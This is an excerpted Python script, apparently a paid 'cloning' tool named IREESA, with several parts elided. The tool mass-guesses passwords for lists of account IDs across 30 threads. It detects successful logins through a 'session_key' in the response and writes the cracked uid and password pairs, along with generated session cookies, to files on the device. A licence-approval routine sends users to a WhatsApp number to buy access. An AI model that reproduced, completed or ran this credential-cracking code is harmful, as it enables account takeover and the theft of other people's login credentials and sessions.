...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('YOUR APPROVAL LINK').text
    if id in httpCaht:
      ...
      print(f'{R}[{G}1{R}]{G} Your Key {R}:{G} IREESA=['+id+']=143')
      linex()
      print(f"{R}[{G}1{R}]{G} THIS TOOL IS  FREE FOR MY BHAI-BROTHERS")
      linex()
      input(f'{R}[{G}1{R}]{G} Click Enter To Sent Key Admin WhatsApp ')
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://wa.me/+8801838711989?text=HEY MY BROTHER APPROVE MY KEY'+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
...
def Main_IREESA():
        ...
        if opt1 == "1": file()   
            ...
            if opt == '2':ind()
            if opt== '3':gmail()
            else:linex();print(f'{R}[{G}={R}]{G} Selected Wrong Option ');time.sleep(2);Main_IREESA()
            if d == '0':Main_IREESA()
            else:linex();print(f'{R}[{G}={R}]{G}  Selected Wrong Option ');time.sleep(2);Main_IREESA()
...
def file():
    clear();print(f"{R}[{G}={R}]{G} Example {R}:{R} /{G}sdcard{R}/{G}IREESA.txt {R}[{G}ETC{R}]{G}");linex()
    ...
    print(f"{R}[{G}={R}]{G} Cloning Accounts Saved in /sdcard/IREESA_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
...
def bd():
                ...
                with tred(max_workers=30) as IREESA:     
                        ...
                        for psx in user:
                                ...
                                IREESA.submit(rd1,ids,passlist)
                print(f'\r{R}--------------------------------------------------')
                print(f"{R}[{G}={R}]{G} Cloning Has Been Completed ")
                print(f'{R}[{G}={R}]{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
                print(f"{R}[{G}={R}]{G} Cloning Accounts Saved in /sdcard/IREESA_M1_FILE_OK.txt")
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}[{G}IREESA-XD{R}]{A}-{R}[{G}%s{R}]{A}-{R}[{G}OK{R}]{A}-{R}[{G}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        status= lock(uid)
                        if "Active" in status:
                        	print(f'\r{R}[{G}IREESA-💚{R}]{G} '+uid+f' {R}|{G} '+pas)
                        print(f"\r{R}[{G}COOKIE{R}]{A} | {G} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'IREESA-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'IREESA-RANDOM-COOKIE.txt')
                        ...
                        print(f'\r{R}[{Y}IREESA-CP{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'IREESA-RANDOM-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}[{G}IREESA-M1{R}]{A}-{R}[{G}%s{R}]{A}-{R}[{G}OK{R}]{A}-{R}[{G}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print(f'\r{R}[{G}IREESA-💚{R}]{G} '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}[{G}COOKIE{R}]{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'IREESA-FILE-M1-OK.txt')
                    open('/sdcard/IREESA/IREESA-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}[{Y}IREESA-CP{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'IREESA-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}[{G}IREESA-M2{R}]{A}-{R}[{G}%s{R}]{A}-{R}[{G}OK{R}]{A}-{R}[{G}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}[{G}IREESA-OK{R}] '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}[{G}COOKIE{R}]{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'IREESA-FILE-M2-OK.txt')
                    open('/sdcard/IREESA/IREESA-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}[{Y}IREESA-CP{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'IREESA-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
